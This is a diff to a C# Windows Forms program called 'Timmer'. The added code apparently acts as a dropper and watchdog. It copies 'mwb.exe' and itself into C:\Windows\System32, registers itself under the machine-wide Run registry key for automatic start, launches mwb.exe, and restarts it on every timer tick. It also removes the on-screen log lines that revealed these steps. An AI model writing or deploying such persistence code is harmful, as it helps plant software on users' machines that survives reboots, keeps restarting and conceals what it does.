@@ -18,10 +18,14 @@ namespace Timmer
 {
     public partial class Form1 : Form
     {
+        string dir = Directory.GetCurrentDirectory();
+        string exemwb = "\"C:\\Windows\\System32\\mwb.exe\"";
+        string exeTimmer = "\"C:\\Windows\\System32\\Timmer.exe\"";
         public Form1()
         {
             InitializeComponent();
-            Copymyself();
+            Copymwb();
+            CopyTimmer();
             Runmwb();
             SetAutoRun();
         }
@@ -33,10 +37,9 @@ namespace Timmer
 
         public void SetAutoRun()
         {
-            textBox1.Text += "setauto start" + Environment.NewLine;
             //获得文件的当前路径 
             string dir = Directory.GetCurrentDirectory();
-            string exeDir = "\"C:\\Windows\\System32\\mwb.exe\"";
+            
 
             RegistryKey reg = null;
             reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
@@ -44,13 +47,9 @@ namespace Timmer
             {
                 reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
             }
-            reg.SetValue("mwb", exeDir);
+            reg.SetValue("mwb", exeTimmer);
             reg.Close();
 
-            Closeme();
-            //Application.Exit();
-            //Environment.Exit(0);
-            textBox1.Text += "setauto over" + Environment.NewLine;
         }
         public void Closeme()
         {
@@ -58,13 +57,10 @@ namespace Timmer
         }
         public void Runmwb()
         {
-            textBox1.Text += "run start" + Environment.NewLine;
-            Process.Start(@"C:\Windows\System32\mwb.exe");
-            textBox1.Text += "run over" + Environment.NewLine;
+            Process.Start(exemwb);
         }
-        private  void Copymyself()
+        private  void Copymwb()
         {
-            textBox1.Text += "copy start" + Environment.NewLine;
             string fileName = "mwb.exe";
             string sourcePath = Directory.GetCurrentDirectory();
             string targetPath = @"C:\\Windows\\System32\\";
@@ -75,7 +71,23 @@ namespace Timmer
                 System.IO.Directory.CreateDirectory(targetPath);
             }
             System.IO.File.Copy(sourceFile, destFile, true);
-            textBox1.Text += "copy over" + Environment.NewLine;
+        }
+        private void CopyTimmer()
+        {
+            string fileName = "Timmer.exe";
+            string sourcePath = Directory.GetCurrentDirectory();
+            string targetPath = @"C:\\Windows\\System32\\";
+            string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
+            string destFile = System.IO.Path.Combine(targetPath, fileName);
+            if (!System.IO.Directory.Exists(targetPath))
+            {
+                System.IO.Directory.CreateDirectory(targetPath);
+            }
+            System.IO.File.Copy(sourceFile, destFile, true);
+        }
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Runmwb();
         }
 
 
